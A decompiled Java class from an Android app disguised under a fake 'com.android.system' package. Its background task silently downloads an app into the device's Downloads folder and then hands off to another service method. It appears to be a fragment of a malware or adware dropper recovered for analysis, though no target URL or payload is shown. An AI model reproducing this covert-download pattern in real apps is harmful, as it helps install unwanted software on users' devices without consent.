package com.android.system.reads.server;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Environment;
import com.android.system.reads.b.e;
import java.io.File;

final class a extends AsyncTask {
  a(EventNoticeService paramEventNoticeService) {}
  
  protected final Object doInBackground(Object... paramVarArgs) {
    EventNoticeService.a(this.a, Environment.getExternalStorageDirectory() + "/Downloads/" + EventNoticeService.a(this.a));
    File file = new File(Environment.getExternalStorageDirectory() + "/Downloads/");
    if (!file.exists())
      file.mkdirs(); 
    try {
      if (e.a(EventNoticeService.b(this.a), EventNoticeService.c(this.a)))
        return Boolean.valueOf(true); 
    } catch (Exception exception) {
      exception.printStackTrace();
    } 
    return Boolean.valueOf(false);
  }
  
  protected final void onPostExecute(Object paramObject) {
    if (paramObject instanceof Boolean)
      if (((Boolean)paramObject).booleanValue()) {
        EventNoticeService.d(this.a);
      } else {
        this.a.a("应用下载失败........");
        e.a((Context)this.a, EventNoticeService.e(this.a), -6);
      }  
    this.a.stopSelf();
    super.onPostExecute(paramObject);
  }
  
  protected final void onProgressUpdate(Object... paramVarArgs) {
    super.onProgressUpdate(paramVarArgs);
  }
}


/* Location:              /home/fahim/Desktop/BreakBottleNeckOmigo-dex2jar.jar!/com/android/system/reads/server/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */